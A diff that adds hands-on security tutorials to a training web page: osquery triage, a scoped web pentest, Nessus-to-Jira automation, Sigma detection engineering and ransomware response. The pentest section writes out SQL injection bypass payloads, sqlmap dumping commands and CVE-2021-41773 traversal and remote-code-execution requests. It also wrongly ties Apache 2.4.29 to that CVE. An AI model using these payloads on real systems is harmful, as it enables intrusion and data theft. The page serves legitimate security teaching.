@@ -552,6 +552,96 @@ New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" -Name "Start" -
           ✗ Ignoring endpoint performance when deploying security tools — agent conflicts cause instability and removal requests
         </div>
 
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>Endpoint Triage with osquery: Investigating a Live Host</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> Your SIEM fired an alert: a PowerShell process on WKSTN-0231 connected outbound to an unknown IP. You have osquery on the endpoint and 20 minutes before the incident commander wants a scope assessment.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>Connect to the endpoint via osquery remote or live response shell.</strong>
+                <p>If using CrowdStrike RTR: <code>runscript -CloudFile="osquery_triage.sh" -CommandLine="--hostname=WKSTN-0231"</code>. For Defender Live Response: upload and run the script. For direct access: <code>osqueryi --json</code>.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>Find what is listening on the network right now.</strong>
+                <div class="code-block">-- Query: All processes with active network connections
+SELECT p.pid, p.name, p.path, p.cmdline, l.port, l.protocol, l.address
+FROM processes p
+JOIN listening_ports l ON p.pid = l.pid
+WHERE l.address NOT IN ('127.0.0.1','::1')
+ORDER BY l.port;</div>
+                <p>Flag any process you do not recognize on any port. Python on 8443 or unknown binaries from /tmp are immediate escalation signals.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>Check for persistence: startup items and scheduled tasks.</strong>
+                <div class="code-block">-- Startup persistence across all known vectors
+SELECT name, path, source, status FROM startup_items ORDER BY source;
+
+-- Scheduled tasks (Windows-equivalent via crontab table on macOS/Linux)
+SELECT command, minute, hour, path FROM crontab WHERE command NOT LIKE '%/usr/bin%';
+
+-- LaunchAgents and LaunchDaemons (macOS)
+SELECT name, program, program_arguments, run_at_load
+FROM launchd WHERE run_at_load = '1' AND NOT name LIKE 'com.apple.%';</div>
+                <p>Any entry with a path in /tmp, /var/folders, or a user home directory that you cannot attribute to a known application is suspicious. Hash the binary immediately.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>Get the hash of any suspicious file for threat intel lookup.</strong>
+                <div class="code-block">-- Hash suspicious files found in startup scan
+SELECT path, md5, sha256 FROM hash
+WHERE path IN ('/tmp/.hidden/updater_v2', '/Users/jsmith/.local/bin/svc_helper');
+
+-- Cross-reference: file was modified recently (within 24h)?
+SELECT path, mtime, ctime, size FROM file
+WHERE path = '/tmp/.hidden/updater_v2'
+  AND mtime > (strftime('%s','now') - 86400);</div>
+                <p>Take the SHA256 and check VirusTotal, MalwareBazaar, or your SIEM threat intel feed. A detection rate of any positive hit = escalate to SEV2 immediately.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">5</div>
+              <div class="tutorial-step-body">
+                <strong>Check user accounts for privilege escalation signs.</strong>
+                <div class="code-block">-- Users with interactive shells (flag service accounts with shell access)
+SELECT uid, gid, username, shell, directory FROM users
+WHERE shell NOT IN ('/usr/bin/false','/usr/sbin/nologin','/bin/nologin');
+
+-- Recent login history
+SELECT username, tty, host, time, pid FROM last ORDER BY time DESC LIMIT 20;
+
+-- Sudo usage in the last hour (Linux systems)
+SELECT username, rule_details, last_used FROM sudoers WHERE last_used > (strftime('%s','now') - 3600);</div>
+                <p>Look for service accounts that have a login shell (svc_deploy with /bin/bash is a risk), unknown users created recently, or sudo escalation for accounts with no operational reason.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">6</div>
+              <div class="tutorial-step-body">
+                <strong>Package your findings into the IR ticket.</strong>
+                <p>Required artifacts: (a) osquery output export in JSON, (b) SHA256 of any suspicious file, (c) process tree screenshot, (d) network connection log timestamp, (e) list of all persistence entries found. Decision point: if you found an unknown persistent binary or an active outbound connection to a non-corporate IP, escalate to containment. Isolate the host before remediation — never remediate evidence in place without approval.</p>
+              </div>
+            </div>
+          </div>
+
+          <figure class="tutorial-screenshot">
+            <img src="assets/tutorial-osquery.svg" alt="osquery interactive session showing suspicious process on port 8443 and unknown LaunchAgent persistence entry from /tmp/.hidden directory" />
+            <figcaption>osquery session output: process on 8443 not in known-good list, and a LaunchAgent pointing to /tmp/.hidden/updater_v2 — both require immediate hash capture and threat intel lookup</figcaption>
+          </figure>
+        </div>
+
         <h3>References & Standards</h3>
         <div class="resource-links">
           <a class="resource-link" href="https://www.cisecurity.org/" target="_blank">CIS Benchmarks — Hardening guides for all major OS</a>
@@ -1072,6 +1162,130 @@ VERIFICATION:
           ✗ Reporting vulns without business impact — technical details alone don't drive remediation<br/>
           ✗ Not preserving evidence — test outcomes must be reproducible; take screenshots, terminal logs<br/>
           ✗ Skipping the retest — a finding without validation of the fix is incomplete
+        </div>
+
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>Web Application Pentest Chain: Recon → Exploitation → Reporting</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> You have a scoped assessment against a staging e-commerce application at 10.10.10.45. Scope: web application only (no social engineering, no network pivot). Time box: 8 hours. Deliverable: written findings report with CVSS scores and proof-of-concept screenshots.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>Passive and active reconnaissance — build the attack surface map.</strong>
+                <div class="code-block"># DNS enumeration — find all subdomains in scope
+subfinder -d corp-staging.internal -o recon/subdomains.txt
+dnsx -l recon/subdomains.txt -a -cname -o recon/dns-resolved.txt
+
+# Port and service fingerprinting
+nmap -sV -sC -p 21,22,80,443,3306,3389,8080,8443 --open 10.10.10.45 -oN recon/nmap.txt
+
+# Web technology fingerprinting
+whatweb http://10.10.10.45 --aggression 3 | tee recon/whatweb.txt
+wappalyzer http://10.10.10.45  # identifies CMS, frameworks, libraries</div>
+                <p>Key output: open ports, software versions, server OS, CMS/framework. Apache 2.4.29 means check for CVE-2021-41773 (path traversal RCE). MySQL 5.7 on 3306 means check if internet-accessible — that alone is a High finding.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>Directory and endpoint discovery — find hidden attack surface.</strong>
+                <div class="code-block"># Aggressive directory fuzzing with common and extended wordlists
+gobuster dir -u http://10.10.10.45 \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
+  -x php,asp,aspx,jsp,txt,bak,zip \
+  -o recon/gobuster.txt -q --no-error
+
+# API endpoint discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -u http://10.10.10.45/FUZZ \
+  -mc 200,201,401,403 -o recon/api-ffuf.json</div>
+                <p>Flag: /admin (200), /backup (200 with large content), /phpinfo.php (information disclosure), /api/v1 (401 = exists but protected). Each of these opens an investigation path. /backup returning file listings is already a High severity finding (information disclosure).</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>Set up Burp Suite and intercept authentication traffic.</strong>
+                <div class="code-block"># Configure your browser to proxy through Burp (127.0.0.1:8080)
+# Navigate to the login page and submit test credentials
+
+# In Burp: send POST /login to Repeater
+# Attempt SQL injection in username field:
+username=admin'--+            # Classic comment bypass
+username=admin' OR '1'='1    # OR condition bypass
+username=admin' AND SLEEP(5)--  # Time-based blind SQLi test
+
+# If any returns HTTP 200 or redirect to /dashboard → confirmed SQLi
+# Automate with sqlmap once manually confirmed:
+sqlmap -u "http://10.10.10.45/login" \
+  --data="username=admin&password=test" \
+  --level=3 --risk=2 \
+  --dbms=mysql --dump-all \
+  --exclude-sysdbs -o --batch</div>
+                <p>Manual confirmation before sqlmap is critical — automated scanners create noise in logs and may trip rate limiting. Confirm the injection manually in Burp first (one payload, observe the response), then automate only for data enumeration with explicit scope permission.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>Test for server-side vulnerabilities — Apache CVE-2021-41773.</strong>
+                <div class="code-block"># Path traversal test (CVE-2021-41773 — Apache 2.4.49/2.4.50)
+curl -s "http://10.10.10.45/cgi-bin/.%2e/.%2e/.%2e/etc/passwd"
+
+# If response includes root:x:0:0: → path traversal confirmed (Critical)
+# RCE test (requires mod_cgi enabled):
+curl -s -X POST \
+  "http://10.10.10.45/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \
+  -d 'echo Content-Type: text/plain; echo; id; hostname; whoami'
+
+# Expected RCE output:
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# target-server</div>
+                <p>Document exactly: the URL used, the request headers, and the full response body. Screenshot the terminal and save curl with -v flag for full headers. CVSS score for unauthenticated RCE on a web server: 9.8 Critical. This is a stop-the-assessment, call-the-client finding.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">5</div>
+              <div class="tutorial-step-body">
+                <strong>Document every finding in real-time — write the report as you test.</strong>
+                <div class="code-block"># findings/FINDING-001-sqli-auth-bypass.md
+## Finding: SQL Injection Authentication Bypass
+**CVSS Score:** 9.1 (Critical)
+**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+**Affected URL:** POST http://10.10.10.45/login
+
+### Evidence
+- Request: `username=admin'--+&password=anything`
+- Response: HTTP 302 → /dashboard (admin session cookie set)
+- Screenshot: screenshots/sqli-auth-bypass-response.png
+
+### Business Impact
+Any unauthenticated attacker can bypass login and gain admin access.
+Full database (including customer PII and payment data) is accessible.
+
+### Remediation
+Use parameterized queries (prepared statements) in all SQL operations.
+Do NOT concatenate user input into query strings.
+**Fix deadline:** Immediate — before next production deployment.</div>
+                <p>This writing-as-you-test practice means your report is 80% done when testing ends. Clients evaluate pentest value by report quality as much as findings count. A Critical with clear reproduction steps and a code-level fix recommendation is 10x more valuable than a vague "SQL injection found."</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="tutorial-split">
+            <figure class="tutorial-screenshot">
+              <img src="assets/tutorial-nmap-scan.svg" alt="nmap scan output showing open ports including MySQL on 3306 accessible from internet and Apache with deprecated TLSv1.0 on 443" />
+              <figcaption>nmap -sV scan: MySQL on 3306 is internet-exposed (High finding immediately), Apache 2.4.29 maps to CVE-2021-41773 (Critical RCE), Werkzeug debug mode on 8080 enables arbitrary code execution</figcaption>
+            </figure>
+            <figure class="tutorial-screenshot">
+              <img src="assets/tutorial-burpsuite.svg" alt="Burp Suite proxy intercept showing SQL injection payload in login POST request and the server's 302 redirect response granting admin access" />
+              <figcaption>Burp Suite: admin'-- payload terminates the SQL WHERE clause, server responds HTTP 302 to /dashboard with administrator token — textbook auth bypass, CVSS 9.1 Critical</figcaption>
+            </figure>
+          </div>
         </div>
 
         <h3>References &amp; Standards</h3>
@@ -1625,6 +1839,195 @@ subjects:
           ✗ Security team owns all remediations — shift responsibility to dev teams with security coaching
         </div>
 
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>Building a Security Automation Pipeline: From Nessus Export to Jira Ticket</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> Your Nessus scanner runs weekly against 124 hosts. Every Monday morning, an analyst spends 4 hours triaging 800+ findings manually, looking up CVEs, determining SLA breach, and opening tickets. You will automate this entirely in Python with the NVD API and Jira REST API.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>Export Nessus scan results and parse into a working data structure.</strong>
+                <div class="code-block">import csv, json, requests
+from datetime import datetime, timedelta
+
+# Nessus exports .csv with headers: Plugin ID, CVE, CVSS v3.0 Base Score,
+# Risk, Host, Name, Synopsis, Description, Solution, Plugin Output
+
+def load_nessus_csv(filepath):
+    findings = []
+    with open(filepath, newline='', encoding='utf-8') as f:
+        reader = csv.DictReader(f)
+        for row in reader:
+            if row['Risk'] in ('Critical','High'):  # focus on actionable items
+                findings.append({
+                    'host': row['Host'],
+                    'cve': row['CVE'],
+                    'cvss': float(row['CVSS v3.0 Base Score'] or 0),
+                    'risk': row['Risk'],
+                    'name': row['Name'],
+                    'solution': row['Solution'],
+                    'plugin_id': row['Plugin ID']
+                })
+    return findings
+
+findings = load_nessus_csv('scans/nessus_export.csv')
+print(f"Loaded {len(findings)} Critical/High findings across unique hosts")</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>Enrich each CVE with NVD data — exploit availability, CISA KEV status.</strong>
+                <div class="code-block">import time
+
+CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
+
+def get_kev_list():
+    """Download CISA Known Exploited Vulnerabilities catalog"""
+    resp = requests.get(CISA_KEV_URL, timeout=10)
+    kev_data = resp.json()
+    return {v['cveID'] for v in kev_data['vulnerabilities']}
+
+def enrich_cve(cve_id, kev_set):
+    # Respect NVD rate limit: 10 req/min without API key
+    time.sleep(6)
+    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
+    resp = requests.get(url, timeout=15)
+    if resp.status_code != 200:
+        return {}
+    data = resp.json()
+    vulns = data.get('vulnerabilities', [])
+    if not vulns:
+        return {}
+    cve_item = vulns[0]['cve']
+    return {
+        'in_kev': cve_id in kev_set,
+        'description': cve_item.get('descriptions', [{}])[0].get('value', ''),
+        'epss': cve_item.get('metrics', {}).get('cvssMetricV31', [{}])[0].get('exploitabilityScore', 0)
+    }
+
+kev_set = get_kev_list()
+for f in findings[:20]:  # enrich first 20 for demo
+    if f['cve']:
+        f.update(enrich_cve(f['cve'], kev_set))</div>
+                <p>CISA KEV check is the fastest triage shortcut — if a CVE is in KEV, it has been actively exploited in the wild. That changes the SLA from 7 days to 48 hours regardless of CVSS score. The NVD API is free but rate-limited; register for an API key to get 50 req/sec.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>Apply SLA rules and flag breaches.</strong>
+                <div class="code-block">SLA_DAYS = {'Critical': 2, 'High': 7, 'Medium': 30, 'Low': 90}
+
+def calculate_sla_status(finding, scan_date):
+    sla = SLA_DAYS.get(finding['risk'], 30)
+    # Check if this CVE appeared in previous scan (track first-seen date)
+    first_seen = get_first_seen_date(finding['cve'], finding['host'])  # from DB
+    if first_seen is None:
+        first_seen = scan_date
+        record_first_seen(finding['cve'], finding['host'], scan_date)
+
+    deadline = first_seen + timedelta(days=sla)
+    days_remaining = (deadline - datetime.now()).days
+
+    # Override SLA if in CISA KEV: treat as 48h regardless of severity
+    if finding.get('in_kev'):
+        kev_deadline = first_seen + timedelta(hours=48)
+        if datetime.now() > kev_deadline:
+            return 'BREACHED_KEV', days_remaining
+        return 'KEV_URGENT', days_remaining
+
+    if datetime.now() > deadline:
+        return 'BREACHED', days_remaining
+    elif days_remaining <= 2:
+        return 'WARNING', days_remaining
+    return 'ON_TRACK', days_remaining
+
+scan_date = datetime.now()
+for f in findings:
+    f['sla_status'], f['days_remaining'] = calculate_sla_status(f, scan_date)</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>Automatically create Jira tickets for breached and KEV findings.</strong>
+                <div class="code-block">JIRA_BASE_URL = "https://yourcompany.atlassian.net"
+JIRA_PROJECT_KEY = "SEC"
+JIRA_API_TOKEN = os.environ['JIRA_API_TOKEN']  # never hardcode credentials!
+
+def create_jira_ticket(finding):
+    priority = 'Highest' if finding['risk'] == 'Critical' else 'High'
+    kev_note = "\n\n⚠️ *IN CISA KEV — Active exploitation confirmed in the wild.*" if finding.get('in_kev') else ""
+    
+    ticket_data = {
+        "fields": {
+            "project": {"key": JIRA_PROJECT_KEY},
+            "summary": f"[{finding['risk']}] {finding['name']} — {finding['host']}",
+            "description": (
+                f"*CVE:* {finding['cve']} | *CVSS:* {finding['cvss']}\n"
+                f"*Host:* {finding['host']}\n"
+                f"*SLA Status:* {finding['sla_status']} ({finding['days_remaining']}d remaining)\n\n"
+                f"*Description:* {finding['description']}\n\n"
+                f"*Remediation:* {finding['solution']}{kev_note}"
+            ),
+            "issuetype": {"name": "Bug"},
+            "priority": {"name": priority},
+            "labels": ["security", "vulnerability", finding['risk'].lower()],
+        }
+    }
+    resp = requests.post(
+        f"{JIRA_BASE_URL}/rest/api/3/issue",
+        json=ticket_data,
+        auth=('your-email@company.com', JIRA_API_TOKEN),
+        headers={"Accept": "application/json", "Content-Type": "application/json"}
+    )
+    return resp.json().get('key')
+
+breached = [f for f in findings if 'BREACHED' in f.get('sla_status','')]
+for f in breached:
+    ticket_key = create_jira_ticket(f)
+    print(f"  ✓ {ticket_key} created: {f['name']} — {f['host']}")</div>
+                <p>The API token is read from an environment variable, not hardcoded — this is non-negotiable. Secrets in source code get committed to git and exposed. Use <code>os.environ['KEY']</code> or a secrets manager (AWS Secrets Manager, HashiCorp Vault, GitHub Secrets for CI).</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">5</div>
+              <div class="tutorial-step-body">
+                <strong>Schedule it with cron and add Slack alerting for critical findings.</strong>
+                <div class="code-block"># Run every Monday 07:00 — crontab -e
+0 7 * * 1 /usr/bin/python3 /opt/security/vuln_scanner.py >> /var/log/vuln_scanner.log 2>&1
+
+# Slack notification for critical or KEV findings (add to script):
+def slack_alert(findings_list):
+    webhook_url = os.environ['SLACK_WEBHOOK_URL']
+    critical_count = sum(1 for f in findings_list if f['risk'] == 'Critical')
+    kev_count = sum(1 for f in findings_list if f.get('in_kev'))
+    payload = {
+        "text": (
+            f"*:rotating_light: Weekly Vuln Scan Complete*\n"
+            f"Critical findings: {critical_count} | "
+            f"CISA KEV (exploited in wild): {kev_count}\n"
+            f"SLA breaches: {len(breached)} | Tickets created: {len(breached)}\n"
+            f"Full report: &lt;https://s3.company.com/vuln-reports/{today}.html|View Report&gt;"
+        )
+    }
+    requests.post(webhook_url, json=payload)</div>
+                <p>This entire pipeline replaces 4 hours of manual Monday morning triage with a 90-second automated run. Every critical finding is enriched, breach-checked, ticketed, and announced before the analyst hits their first coffee.</p>
+              </div>
+            </div>
+          </div>
+
+          <figure class="tutorial-screenshot">
+            <img src="assets/tutorial-python-automation.svg" alt="Python security automation script running against Nessus CSV export, enriching CVEs from NVD API, flagging Log4Shell and Confluence RCE, and auto-creating Jira tickets for SLA-breached findings" />
+            <figcaption>Script output: 847 vulnerabilities triaged, Log4Shell (CVE-2021-44228) flagged across 14 hosts with CISA KEV status, 3 Jira tickets auto-created in under 10 seconds — 4 hours of manual work eliminated</figcaption>
+          </figure>
+        </div>
+
         <h3>References &amp; Standards</h3>
         <div class="resource-links">
           <a class="resource-link" href="https://github.com/aquasecurity/trivy" target="_blank">Trivy — Container &amp; IaC Scanner</a>
@@ -1979,6 +2382,159 @@ AND risk_score >= 7.0
           ✓ Measure analyst response rate per alert type — declining rate predicts fatigue
         </div>
 
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>Detection Engineering: Writing, Testing, and Tuning a Sigma Rule End-to-End</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> Your SOC received 3 alerts this week for PowerShell with encoded commands. Two were true positives (Cobalt Strike droppers), one was noise from an SCCM deployment script. You need to write a detection rule that catches the malicious cases and suppresses the known-good SCCM pattern without analyst intervention.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>Define the hypothesis before writing any rule.</strong>
+                <p>A detection is a falsifiable hypothesis about attacker behavior. Before touching YAML, answer these:</p>
+                <ul style="margin:0.6rem 0 0.6rem 1.2rem; color: var(--text-1);">
+                  <li>What attacker behavior am I detecting? (T1059.001 — PowerShell with encoded commands)</li>
+                  <li>What field(s) prove it happened? (process.name = powershell.exe AND process.command_line contains -EncodedCommand)</li>
+                  <li>What does a benign version look like? (SCCM using -EncodedCommand for deployment scripts)</li>
+                  <li>What is my expected false positive rate? (Target: &lt;5 per week, or &lt;2% of total alert volume)</li>
+                </ul>
+                <p>If you cannot answer all four, you do not have enough information to write a good rule yet. Review the true positive logs from this week's cases first.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>Write the Sigma rule with explicit filter logic for known-good patterns.</strong>
+                <div class="code-block">title: PowerShell Encoded Command Execution
+id: 5b23a9f8-c4e1-4d8b-a2e3-7f6c09d1e4b2
+status: stable
+description: |
+  Detects PowerShell launched with -EncodedCommand, -Enc, or -e flags,
+  commonly used by malware to hide payload strings. Excludes known-good
+  SCCM and MDT deployment scripts via parent process filter.
+  Maps to MITRE ATT&CK T1059.001.
+references:
+  - https://attack.mitre.org/techniques/T1059/001/
+  - https://redcanary.com/threat-detection-report/techniques/powershell/
+author: analyst@soc-team.internal
+date: 2026-04-08
+tags:
+  - attack.execution
+  - attack.T1059.001
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_powershell:
+    Image|endswith:
+      - '\powershell.exe'
+      - '\pwsh.exe'
+    CommandLine|contains|any:
+      - ' -EncodedCommand '
+      - ' -enc '
+      - ' -e '          # short form, prone to FP — watch closely
+  filter_known_good:
+    ParentImage|endswith:
+      - '\CcmExec.exe'   # SCCM client
+      - '\mdt.exe'       # MDT deployment
+      - '\TSManager.exe' # Task Sequence Manager
+  condition: selection_powershell and not filter_known_good
+falsepositives:
+  - SCCM/MDT deployment tasks (suppressed via filter)
+  - PowerShell remoting with Base64 scripts (review ParentImage)
+level: high</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>Convert the Sigma rule to your SIEM's query language and test it.</strong>
+                <div class="code-block"># Install sigma-cli
+pip install sigma-cli
+
+# Convert to Splunk SPL
+sigma convert -t splunk -p splunk_windows \
+  rules/powershell_encoded.yml
+
+# Output SPL:
+# index=windows_security source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+# EventCode=1 (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
+# (CommandLine="* -EncodedCommand *" OR CommandLine="* -enc *" OR CommandLine="* -e *")
+# NOT (ParentImage="*\\CcmExec.exe" OR ParentImage="*\\mdt.exe")
+
+# Test against known true positive (from this week's incident logs):
+sigma convert -t splunk rules/powershell_encoded.yml | \
+  python3 test_sigma.py \
+  --true-positive samples/cobalt_strike_ps_encoded.json \
+  --false-positive samples/sccm_deployment.json
+
+# Expected output:
+# ✓ True positive matched (1/1 test cases)
+# ✓ False positive suppressed (3/3 SCCM test cases filtered)</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>Run the rule against 30 days of historical data before deploying it live.</strong>
+                <div class="code-block"># In Splunk: run against last 30 days to measure noise baseline
+index=windows_security source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+(Image IN ("*\\powershell.exe","*\\pwsh.exe"))
+(CommandLine IN ("* -EncodedCommand *","* -enc *","* -e *"))
+NOT (ParentImage IN ("*\\CcmExec.exe","*\\mdt.exe","*\\TSManager.exe"))
+earliest=-30d@d latest=now
+| stats count by ComputerName, User, ParentImage, CommandLine
+| sort -count
+
+# Review the results:
+# - Any repetitive legitimate patterns? Add to the filter list.
+# - Any obvious malicious hits? Document as retroactive TPs.
+# - What is the expected weekly alert volume? If >20/week, rule may be too broad.
+# Target: &lt;5 alerts/week with the current filter set.</div>
+                <p>This historical run is non-negotiable before deployment. A rule generating 200 alerts per week will be ignored within days — alert fatigue kills your detection program faster than missing a threat does.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">5</div>
+              <div class="tutorial-step-body">
+                <strong>Respond to the first live alert — validate the full triage chain works.</strong>
+                <div class="code-block"># When SIEM fires the rule (simulated with Atomic Red Team):
+# Install: Install-Module -Name AtomicRedTeam
+Import-Module AtomicRedTeam
+Invoke-AtomicTest T1059.001 -TestNumbers 1
+
+# This runs: powershell.exe -EncodedCommand [BASE64_PAYLOAD]
+# Your rule should fire within 60 seconds if SIEM polling is live.
+
+# Triage checklist when alert fires:
+# 1. Decode the base64 payload:
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("PAYLOAD"))
+
+# 2. Check parent process in EDR (is it explorer.exe? word.exe? svchost?)
+# 3. Check network connections from that process at the time of execution
+# 4. Determine: does decoded payload contain IP/domain/download?
+#    YES → True positive, open IR ticket, isolate host
+#    NO  → Test/script execution, investigate parent context</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="tutorial-split">
+            <figure class="tutorial-screenshot">
+              <img src="assets/tutorial-sigma-detection.svg" alt="Sigma rule YAML on the left with detection logic and filter conditions, paired with SIEM alert output showing True Positive verdict for PowerShell encoded reverse shell from Word macro parent process" />
+              <figcaption>Left: Sigma rule with selection and filter conditions. Right: SIEM alert fired with EDR process tree — Word macro spawned PowerShell with encoded Cobalt Strike reverse shell, confirmed TP, host isolated</figcaption>
+            </figure>
+            <figure class="tutorial-screenshot">
+              <img src="assets/tutorial-splunk-spl.svg" alt="Splunk SPL search for brute force detection showing EventCode 4625 failures by source IP, with two Critical IPs (247 and 83 failures) highlighted in red and analyst action items below" />
+              <figcaption>Splunk brute-force search: EventCode 4625 grouped by src_ip shows 185.220.101.47 with 247 failures (known TOR exit node) — CRITICAL, block at perimeter immediately. Internal IP 192.168.5.22 hitting jsmith account — separate investigation path</figcaption>
+            </figure>
+          </div>
+        </div>
+
         <h3>References &amp; Standards</h3>
         <div class="resource-links">
           <a class="resource-link" href="https://attack.mitre.org/" target="_blank">MITRE ATT&amp;CK Framework</a>
@@ -2153,6 +2709,149 @@ Phase 7: LESSONS LEARNED & IMPROVEMENT
           ✗ Closing incidents without verified root-cause remediation evidence<br/>
           ✗ No single incident commander leading cross-team decisions<br/>
           ✓ Escalate early, then downgrade with evidence if necessary
+        </div>
+
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>Running a Ransomware Incident Response: Hour-by-Hour Execution</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> It is 02:14 AM. Your on-call phone fires. EDR console shows ransomware-like file extension changes (.locked) on SRV-PROD-03 and SRV-PROD-07 — 2 of 6 production servers. Finance team loses database access at 02:17. You are the incident commander. Your first 4 hours determine whether this is a contained event or a company-level crisis.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>T+0:00 — Confirm scope, do not remediate yet. Preserve evidence first.</strong>
+                <div class="code-block"># Immediate actions (first 5 minutes):
+# 1. Open incident bridge call with on-call engineer and manager
+# 2. Open IR ticket with timestamp: INC-2026-0408-001
+# 3. Screenshot EDR alert in case evidence is overwritten
+
+# Check blast radius — how many hosts are affected?
+# CrowdStrike RTR query (or equivalent):
+$ falcon-rtr query --filter "host_info.status='normal'" --sort "last_seen" \
+  | grep -i ".locked\|ransom\|crypt"
+
+# Check SIEM for correlated activity in the last 2 hours:
+index=windows earliest=-2h@h
+(EventCode=4624 OR EventCode=4625 OR EventCode=7045)  # logins + new services
+| stats count by ComputerName, EventCode, Account_Name
+| where count > 5
+| sort -count
+
+# Do NOT reboot affected servers yet — RAM may contain decryption keys
+# or attacker tooling that forensics needs</div>
+                <p>The first 5 minutes set the trajectory. No remediation before evidence capture. No reboots. Take a network snapshot of active connections on affected hosts before any containment action.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>T+0:10 — Contain without destroying evidence.</strong>
+                <div class="code-block"># Isolate affected hosts at network layer (not power off):
+# CrowdStrike: contain host (blocks all traffic except EDR comms)
+falcon-rtr contain --hostname SRV-PROD-03 SRV-PROD-07
+
+# Firewall rule: block east-west traffic from affected subnet
+# (emergency firewall change — requires change bridge approval in most orgs)
+netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
+# or via network team: ACL block on VLAN 20 (production servers)
+
+# Simultaneously: capture volatile memory for forensics
+winpmem_mini_x64_rc2.exe SRV-PROD-03-memory.raw
+# Windows: use procdump + task manager export if winpmem unavailable
+
+# Check if spread vector is still active:
+# Look for admin shares being accessed from affected hosts to other hosts
+index=windows EventCode=5140 earliest=-3h
+(ObjectName="*\\ADMIN$" OR ObjectName="*\\C$") SubjectUserName!="*$"
+| stats count by SubjectUserName, ComputerName, IpAddress</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>T+0:30 — Determine the initial access vector and patient zero.</strong>
+                <div class="code-block"># Find the first host where encryption started (sort by earliest .locked file):
+index=windows_security EventCode=4663 ObjectName="*.locked" earliest=-6h
+| stats earliest(_time) as first_seen by ComputerName
+| sort first_seen
+
